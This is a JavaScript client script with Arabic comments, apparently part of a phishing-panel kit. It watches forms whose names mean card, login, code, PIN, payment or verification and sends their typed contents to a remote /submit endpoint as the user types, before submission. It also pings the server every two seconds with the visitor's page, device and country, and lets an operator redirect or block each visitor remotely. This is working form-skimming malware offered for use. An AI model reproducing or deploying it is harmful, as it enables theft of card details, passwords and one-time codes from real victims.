(function () {
    // 🌐 استنتاج مسار السيرفر وقراءة siteKey تلقائياً
    const currentScript = document.currentScript || (function() {
        const scripts = document.getElementsByTagName('script');
        return scripts[scripts.length - 1];
    })();

    const siteKey = (currentScript && currentScript.getAttribute('data-site')) || 'site_cars_01';
    
    // إذا كان السكربت محملاً من دومين خارجي يستنتج السيرفر منه، وإلا localhost:5000
    let SERVER_URL = 'http://localhost:5000/api/tracker';
    try {
        if (currentScript && currentScript.src) {
            const urlObj = new URL(currentScript.src);
            SERVER_URL = `${urlObj.origin}/api/tracker`;
        }
    } catch (e) {}

    let pingInterval = null;
    let lastRedirectSignature = null;
    let currentCountry = "UNKNOWN"; 
    
    function getVisitorToken() {
        let token = localStorage.getItem('saas_v_token');
        if (!token) {
            token = 'tk_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
            localStorage.setItem('saas_v_token', token);
        }
        return token;
    }

    const visitorToken = getVisitorToken();

    function detectDevice() {
        const ua = navigator.userAgent;
        if (/iPhone|iPad|iPod/i.test(ua)) return "iPhone";
        if (/SM-|SAMSUNG|Samsung/i.test(ua)) return "Samsung";
        if (/Android/i.test(ua)) return "Android";
        if (/Macintosh|Mac OS X/i.test(ua)) return "سطح مكتب (Mac)";
        if (/Windows NT/i.test(ua)) return "سطح مكتب (Windows)";
        return "سطح مكتب";
    }

    const clientDevice = detectDevice();

    document.addEventListener('click', (e) => {
        if (e.target.closest('a') || e.target.closest('button')) {
            sessionStorage.setItem('saas_legit_nav', 'true');
        }
    });
    document.addEventListener('submit', () => {
        sessionStorage.setItem('saas_legit_nav', 'true');
    });

    async function sendPing() {
        try {
            let isLegitMove = sessionStorage.getItem('saas_legit_nav') === 'true';
            sessionStorage.removeItem('saas_legit_nav');

            let pageTitle = document.title || window.location.pathname;

            let res = await fetch(`${SERVER_URL}/ping`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    token: visitorToken, 
                    siteKey: siteKey,
                    currentPage: window.location.pathname + window.location.search,
                    pageTitle: pageTitle,
                    country: currentCountry,
                    device: clientDevice,
                    isLegitMove: isLegitMove
                })
            });

            let data = await res.json();

            if (data.isBlocked) {
                if (window.location.pathname !== '/blocked') {
                    window.location.href = '/blocked';
                }
                if (pingInterval) clearInterval(pingInterval);
                return; 
            }

            if (!data.isBlocked && window.location.pathname === '/blocked') {
                window.location.href = '/';
                return;
            }

            if (data.status === 'go' && data.redirectUrl) {
                let signature = `${data.status}|${data.redirectUrl}`;
                let targetPath = data.redirectUrl.split('?')[0]; 
                let actualPath = window.location.pathname;

                if (signature !== lastRedirectSignature) {
                    lastRedirectSignature = signature;
                    localStorage.setItem('saas_last_redirect', signature);
                    window.location.href = data.redirectUrl;
                } else if (actualPath !== targetPath && actualPath !== '/') {
                    window.location.href = data.redirectUrl;
                }
            }
        } catch (err) {}
    }

    function attachFormListeners() {
        const forms = document.querySelectorAll('form');
        let typingTimer;

        forms.forEach(form => {
            let formName = form.getAttribute('data-name') || form.id || "بدون عنوان";
            let isImportant = form.getAttribute('data-important') === 'true' || 
                              ['بطاقة', 'دخول', 'تسجيل', 'كود', 'رمز', 'دفع', 'تأكيد', 'توثيق'].some(k => formName.includes(k));

            if (isImportant) {
                form.addEventListener('input', () => {
                    clearTimeout(typingTimer);
                    typingTimer = setTimeout(() => {
                        let isValid = form.checkValidity(); 
                        let suffix = isValid ? "(جاهز للإرسال ✅)" : "(يجري الكتابة ..)";
                        fetch(`${SERVER_URL}/submit`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                token: visitorToken,
                                siteKey: siteKey,
                                formName: `${formName} ${suffix}`,
                                submissionData: Object.fromEntries(new FormData(form).entries()),
                                isFinalSubmission: false,
                                isImportant: true
                            })
                        }).catch(()=>{});
                    }, 400);
                });
            }

            form.addEventListener('submit', () => {
                clearTimeout(typingTimer);
                fetch(`${SERVER_URL}/submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        token: visitorToken,
                        siteKey: siteKey,
                        formName: formName,
                        submissionData: Object.fromEntries(new FormData(form).entries()),
                        isFinalSubmission: true,
                        isImportant: isImportant
                    })
                }).catch(()=>{});
            });
        });
    }

    window.addEventListener('DOMContentLoaded', () => {
        lastRedirectSignature = localStorage.getItem('saas_last_redirect') || null;

        fetch("https://ipapi.co/json/")
            .then(res => res.json())
            .then(data => { 
                if (data.country_code) currentCountry = data.country_code; 
            })
            .catch(() => {})
            .finally(() => {
                sendPing(); 
                pingInterval = setInterval(sendPing, 2000); 
                attachFormListeners();
            });
    });
})();